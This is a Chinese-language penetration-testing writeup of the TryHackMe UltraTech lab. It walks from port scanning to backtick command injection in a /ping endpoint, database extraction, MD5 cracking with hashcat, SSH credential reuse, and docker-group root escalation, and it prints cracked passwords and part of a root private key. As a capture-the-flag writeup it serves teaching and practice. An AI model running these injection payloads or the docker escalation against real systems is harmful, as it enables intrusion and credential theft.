# THM UltraTech 渗透测试 Writeup

**日期**: 2026-05-27
**目标**: 10.48.185.71 / 10.49.152.249 (TryHackMe UltraTech)
**授权**: THM 授权靶场，全 IP 范围，无限制
**目标**: 获取 root 用户 SSH 私钥的前 9 个字符

---

## 攻击链概览

```
信息搜集 → Web枚举 → API分析 → 命令注入 → 数据库泄露 → MD5破解 → Web登录 → SSH凭据复用 → Docker提权 → 读取私钥
```

---

## 1. 信息搜集

### 端口扫描
```bash
nmap -sV -sC -p- --min-rate 1000 10.48.185.71
```

**开放端口：**
| 端口      | 服务 | 版本            |
| --------- | ---- | --------------- |
| 21/tcp    | FTP  | vsftpd 3.0.5    |
| 22/tcp    | SSH  | OpenSSH 8.2p1   |
| 8081/tcp  | HTTP | Node.js Express |
| 31331/tcp | HTTP | Apache 2.4.41   |

---

## 2. Web 枚举

### 目录扫描
```bash
gobuster dir -k -u http://10.48.185.71:31331 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
```

**发现页面：**
- `/robots.txt` → 暴露 `/utech_sitemap.txt`
- `/what.html` → UltraTech 介绍页
- `/partners.html` → 登录页面 (Private Partners Area)
- `/js/api.js` → **关键文件，暴露内部 API**

### API 分析 (js/api.js)
```javascript
function getAPIURL() {
    return `${window.location.hostname}:8081`
}

function checkAPIStatus() {
    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
    // ...
}

form.action = `http://${getAPIURL()}/auth`;
```

**发现：**
- API 基础地址: `:8081`
- 检查端点: `/ping?ip=<host>` ← **可能存在命令注入**
- 认证端点: `/auth`

---

## 3. 命令注入

### 测试过程
```bash
# 基础测试
curl "http://10.48.185.71:8081/ping?ip=127.0.0.1"

# 反引号注入测试
curl "http://10.48.185.71:8081/ping?ip=%60id%60"
# 返回: ping: groups=1002(www): Name or service not known
```

**关键发现：**

- `;` 和 `|` 被过滤
- 反引号 `` ` `` 未过滤，成功执行命令
- 当前运行身份: www 用户

### 数据库发现
```bash
curl "http://10.48.185.71:8081/ping?ip=%60ls%60"
# 返回: ping: utech.db.sqlite: Name or service not known
```

发现 SQLite 数据库文件 `utech.db.sqlite`

### 数据库读取
```bash
curl -s "http://10.48.185.71:8081/ping?ip=%60cat%20utech.db.sqlite%60"
# 提取到用户凭据信息

curl -s "http://10.48.185.71:8081/ping?ip=%60cat%20utech.db.sqlite%60"
# 发现两个用户: r00t 和 admin，附 MD5 哈希
```

---

## 4. 密码破解

### 提取的哈希
| 用户  | MD5 哈希                         |
| ----- | -------------------------------- |
| r00t  | f357a0c52799563c7c7b76c1e7543a32 |
| admin | 0d0ea5111e3c1def594c1684e3b9be84 |

### Hashcat 破解
```bash
echo 'f357a0c52799563c7c7b76c1e7543a32\n0d0ea5111e3c1def594c1684e3b9be84' > /tmp/hashes.txt
hashcat -m 0 -a 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**结果（耗时 2 秒）：**
| 用户  | 明文密码     |
| ----- | ------------ |
| r00t  | **n100906**  |
| admin | **mrsheafy** |

---

## 5. Web 登录

### 分析 partners.html
发现表单使用 **GET 方法**：
```html
<form method='GET' ...>
    <input type="text" name="login">
    <input type="password" name="password">
</form>
```

### 登录请求
```bash
curl -s "http://10.48.185.71:8081/auth?login=r00t&password=n100906"
```

**返回：**
```html
<h1>Restricted area</h1>
<p>Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!<br/><br/>
<i>lp1</i></p>
```

---

## 6. SSH 凭据复用

### 尝试 SSH 登录
```bash
sshpass -p n100906 ssh r00t@10.49.152.249
```

**成功登录！**
- 用户: r00t
- 主机: Ubuntu 20.04.6 LTS
- UID: 1001

---

## 7. 权限提升

### 发现 Docker 组
```bash
id
# uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

**r00t 在 docker 组！**

### Docker 提权
```bash
# 检查本地镜像
docker images
# REPOSITORY    TAG       IMAGE ID       CREATED        SIZE
# bash          latest    495d6437fc1e   7 years ago    15.8MB

# 利用 docker 挂载宿主机根目录
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/bash
```

**成功获取 root shell！**

---

## 8. 获取目标

### 读取 root 私钥
```bash
cat /root/.ssh/id_rsa | head -2
```

**输出：**
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
```

**答案：root 私钥前 9 个字符为 `MIIEogIBA`**

---

## 技术总结

### 发现的漏洞
1. **OS 命令注入** (严重): Node.js Express /ping 端点拼接用户输入到系统命令
2. **SQLite 数据库泄露** (高危): 数据库文件位于 Web 可访问目录，通过命令注入读取
3. **MD5 弱哈希** (高危): 使用 MD5 存储密码，可被快速破解
4. **GET 方式传输密码** (中危): 登录表单使用 GET 方法，凭据暴露在 URL 中
5. **Docker 组权限过大** (严重): 普通用户在 docker 组可直接获取 root 权限

### 权限提升路径
```
命令注入 (www-data) → 数据库泄露 → MD5破解 → Web登录 → SSH凭据复用 (r00t) → Docker组提权 → root
```

### 关键命令
```bash
# 命令注入测试
curl "http://10.48.185.71:8081/ping?ip=%60id%60"

# 数据库读取
curl -s "http://10.48.185.71:8081/ping?ip=%60strings%20utech.db.sqlite%60"

# Hashcat 破解
hashcat -m 0 hashes.txt rockyou.txt --force

# Docker 提权
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/bash

# 读取私钥
cat /root/.ssh/id_rsa | head -2
```

